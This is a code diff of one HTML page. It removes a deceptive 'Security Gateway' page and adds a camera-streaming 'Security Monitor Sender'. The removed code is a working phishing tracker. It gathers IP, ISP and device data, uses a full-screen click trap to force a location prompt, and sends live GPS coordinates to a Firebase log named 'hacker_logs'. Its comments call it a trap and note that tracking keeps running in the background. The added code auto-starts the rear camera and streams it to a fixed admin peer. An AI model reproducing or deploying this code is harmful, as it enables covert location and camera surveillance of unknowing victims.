@@ -2,142 +2,223 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Security Gateway</title>
-    
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
-    
-    <!-- Firebase SDK -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
-        import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
-            authDomain: "location-611d6.firebaseapp.com",
-            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
-            projectId: "location-611d6",
-            storageBucket: "location-611d6.firebasestorage.app",
-            messagingSenderId: "903100559116",
-            appId: "1:903100559116:web:08c8c9e1d7282048116329"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-
-        // ১. ফাঁদ পাতা হলো
-        window.initLog = function(data) {
-            const trackerRef = ref(db, 'hacker_logs');
-            const newLogRef = push(trackerRef);
-            
-            set(newLogRef, {
-                timestamp: new Date().toString(),
-                ...data,
-                latitude: "Connecting...",
-                longitude: "Connecting...",
-                actionStatus: "Live Tracking Started..."
-            }).then(() => {
-                sessionStorage.setItem('logKey', newLogRef.key);
-                startLiveTracking(); // লাইভ ট্র্যাকিং শুরু
-            });
-        };
-
-        // ২. লাইভ আপডেট পাঠানো
-        window.updateWithGPS = function(lat, lng) {
-            const key = sessionStorage.getItem('logKey');
-            if (key) {
-                const updateRef = ref(db, 'hacker_logs/' + key);
-                update(updateRef, {
-                    latitude: lat,
-                    longitude: lng,
-                    lastUpdate: new Date().toLocaleTimeString(), // কখন আপডেট হলো
-                    actionStatus: "🔴 Live Tracking Active"
-                });
-            }
-        };
-    </script>
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Monitor Sender</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
+        /* Neumorphism Base Styles */
         body {
-            margin: 0; padding: 0; background-color: #f0f2f5;
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            height: 100vh; overflow: hidden; font-family: sans-serif; cursor: progress;
+            background-color: #e0e5ec;
+            color: #4a4a4a;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            gap: 20px;
+            overflow: hidden;
+            text-align: center;
         }
-        #clickTrap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
-        .loader-box { text-align: center; background: #fff; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
-        .spinner { width: 50px; height: 50px; border: 5px solid #e1e4e8; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Video Frame - যেখানে ক্যামেরা ফিড দেখা যাবে */
+        .camera-frame {
+            width: 95%;
+            max-width: 450px;
+            height: 65vh;
+            border-radius: 20px;
+            background: #e0e5ec;
+            box-shadow: 7px 7px 15px rgb(163,177,198,0.7), 
+                       -7px -7px 15px rgba(255,255,255, 0.9);
+            padding: 15px;
+            position: relative;
+        }
+
+        #localVideo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 15px;
+            display: none; /* শুরুতে লুকানো থাকবে */
+            transform: scaleX(-1); /* মিরর ইফেক্ট */
+        }
+
+        /* Status Panel */
+        .status-panel {
+            font-size: 14px;
+            font-weight: 600;
+            color: #666;
+        }
+
+        /* Status Dot Indicator */
+        #connectionStatus {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 5px;
+            background-color: #ccc;
+            box-shadow: inset 1px 1px 2px rgba(0,0,0,0.2);
+            transition: background 0.3s;
+        }
+        .active { background-color: #00e676 !important; }
+        .error { background-color: #ff3d00 !important; }
+        .waiting { background-color: #ffc107 !important; }
+
     </style>
 </head>
 <body>
-    <div id="clickTrap" onclick="forceBrowserPrompt()"></div>
-    <div class="loader-box">
-        <div class="spinner"></div>
-        <h2 style="color:#333; margin-bottom:5px;">Security Check...</h2>
-        <p style="color:#888; font-size:13px;">Establishing secure connection.</p>
+
+    <div class="camera-frame">
+        <video id="localVideo" autoplay playsinline muted></video>
+        <div class="status-panel" id="message">System Initializing...</div>
+    </div>
+
+    <div class="status-panel">
+        <span id="connectionStatus" class="waiting"></span>
+        Status: <span id="peerIdDisplay">Waiting for ID...</span>
     </div>
 
     <script>
-        let isAsking = false;
+        const localVideo = document.getElementById('localVideo');
+        const peerIdDisplay = document.getElementById('peerIdDisplay');
+        const message = document.getElementById('message');
+        const statusDot = document.getElementById('connectionStatus');
 
-        window.onload = function() {
-            // আইপি ডাটা ফেচ
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => { prepareInitialData(data); })
-                .catch(() => { prepareInitialData({ ip: "Unknown" }); });
-        };
+        let peer = null;
+        let currentStream = null;
+        let facingMode = "environment"; // পেছনের ক্যামেরা
+        const ADMIN_PEER_ID = 'ADMIN_KAWSAR'; // তোর ভাইয়ের Admin Panel-এর আইডি
 
-        function prepareInitialData(ipInfo) {
-            var parser = new UAParser();
-            var result = parser.getResult();
-            let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "Unknown Device");
+        // --- কোর ফাংশনালিটি: ভিডিও এবং সংযোগ ---
 
-            let initialPayload = {
-                ip: ipInfo.ip || "Tracing...",
-                city: ipInfo.city || "Tracing...",
-                isp: ipInfo.org || "Tracing...",
-                deviceModel: deviceName,
-                os: result.os.name,
-                browser: result.browser.name
-            };
+        // ১. ক্যামেরা চালু করা এবং স্ট্রিম নেওয়া
+        async function startCamera() {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+            try {
+                // ক্যামেরা পারমিশন
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode },
+                    audio: false 
+                });
+                localVideo.srcObject = stream;
+                localVideo.style.display = 'block';
+                currentStream = stream;
+                message.innerText = "Camera Active. Connecting...";
+                
+                // ক্যামেরার সাথে সাথে PeerJS সংযোগ শুরু করা
+                connectPeer(); 
 
-            if(window.initLog) window.initLog(initialPayload);
-        }
-
-        // 🔥 লাইভ ট্র্যাকিং লজিক (watchPosition)
-        function startLiveTracking() {
-            setTimeout(forceBrowserPrompt, 100);
-            document.addEventListener('touchstart', forceBrowserPrompt);
-            document.addEventListener('click', forceBrowserPrompt);
-        }
-
-        function forceBrowserPrompt() {
-            if(isAsking) return;
-            isAsking = true;
-
-            if ("geolocation" in navigator) {
-                // getCurrentPosition এর বদলে watchPosition
-                navigator.geolocation.watchPosition(
-                    function(position) {
-                        // যতবার নড়বে, ততবার এই ফাংশন কল হবে
-                        document.querySelector('.spinner').style.borderTopColor = "#00b894";
-                        document.querySelector('h2').innerText = "Verified!";
-                        
-                        // ট্র্যাপ সরিয়ে ফেললাম, কিন্তু ব্যাকগ্রাউন্ডে ট্র্যাকিং চলবে
-                        document.getElementById('clickTrap').style.display = 'none';
-
-                        if(window.updateWithGPS) {
-                            window.updateWithGPS(position.coords.latitude, position.coords.longitude);
-                        }
-                    },
-                    function(error) {
-                        isAsking = false; // আবার চাওয়ার জন্য রেডি
-                    },
-                    { enableHighAccuracy: true, maximumAge: 0 }
-                );
+            } catch (err) {
+                console.error("Camera Error:", err);
+                message.innerText = "Camera Permission Error! Tap to restart.";
+                statusDot.classList.remove('active');
+                statusDot.classList.add('error');
             }
         }
+
+        // ২. PeerJS সংযোগ স্থাপন এবং কল করা
+        function connectPeer() {
+            if (!navigator.onLine) {
+                message.innerText = "No Internet. Waiting...";
+                statusDot.classList.add('waiting');
+                return;
+            }
+
+            // নতুন PeerJS ইনস্ট্যান্স তৈরি বা পুরনোটা ব্যবহার
+            if (!peer || peer.disconnected) {
+                peer = new Peer({
+                    host: 'peerjs.cloud', 
+                    port: 443, 
+                    secure: true,
+                    // এই অ্যাপটি একটা ইউনিক আইডি নিয়ে সার্ভারের সাথে যুক্ত হবে
+                    config: {'iceServers': [{'urls': 'stun:stun.l.google.com:19302'}]}
+                });
+            }
+
+            peer.on('open', (id) => {
+                peerIdDisplay.innerText = `ID: ${id}`;
+                statusDot.classList.remove('waiting', 'error');
+                statusDot.classList.add('active');
+                message.innerText = "System Ready. Waiting for Admin to Connect...";
+                
+                // অ্যাপ চালু হলেই এডমিনকে কল করার চেষ্টা
+                callAdmin(); 
+            });
+
+            peer.on('error', (err) => {
+                console.error("PeerJS Error:", err);
+                statusDot.classList.add('error');
+                message.innerText = "Connection Error! Check Internet/Admin ID.";
+            });
+
+            peer.on('close', () => {
+                statusDot.classList.remove('active');
+                statusDot.classList.add('error');
+                message.innerText = "Connection Lost. Retrying...";
+                setTimeout(connectPeer, 5000); // 5 সেকেন্ড পর আবার চেষ্টা
+            });
+        }
+        
+        // ৩. Admin Panel-কে কল করা
+        function callAdmin() {
+            if (currentStream && peer && peer.open) {
+                // Admin ID-কে কল করা
+                const call = peer.call(ADMIN_PEER_ID, currentStream);
+                message.innerText = `Calling Admin: ${ADMIN_PEER_ID}...`;
+                
+                call.on('stream', (remoteStream) => {
+                    // যদি Admin সংযোগ গ্রহণ করে
+                    message.innerText = "LIVE STREAMING ACTIVE!";
+                    statusDot.classList.add('active');
+                });
+
+                call.on('close', () => {
+                    message.innerText = "Stream Ended. Retrying in 5s...";
+                    setTimeout(callAdmin, 5000);
+                });
+                
+                call.on('error', (err) => {
+                    console.error("Call Error:", err);
+                    message.innerText = "Call Failed. Retrying in 10s...";
+                    setTimeout(callAdmin, 10000);
+                });
+            } else {
+                // যদি স্ট্রিম বা পিয়ার রেডি না থাকে, আবার স্টার্ট করার চেষ্টা
+                setTimeout(startCamera, 1000);
+            }
+        }
+
+        // --- অটো-রিকানেক্ট এবং ব্যাকগ্রাউন্ড লজিক ---
+
+        // ৪. স্ক্রিন অফ/অন হলে কি হবে
+        document.addEventListener("visibilitychange", () => {
+            if (document.visibilityState === 'visible') {
+                message.innerText = "App Resumed. Reconnecting...";
+                startCamera(); // আবার চালু হলে ক্যামেরা এবং সংযোগ চালু হবে
+            } else {
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                }
+                localVideo.style.display = 'none';
+                statusDot.classList.remove('active');
+                message.innerText = "Monitoring Paused (Background Mode)";
+            }
+        });
+        
+        // ৫. ইন্টারনেট চলে গেলে বা আসলে কি হবে
+        window.addEventListener('online', startCamera); // নেট আসলে সব আবার চালু
+        window.addEventListener('offline', () => {
+            message.innerText = "Internet OFFLINE! Waiting...";
+            statusDot.classList.remove('active');
+            statusDot.classList.add('waiting');
+        });
+
+        // অ্যাপ লোড হলেই সব শুরু
+        window.addEventListener('load', startCamera);
     </script>
 </body>
 </html>
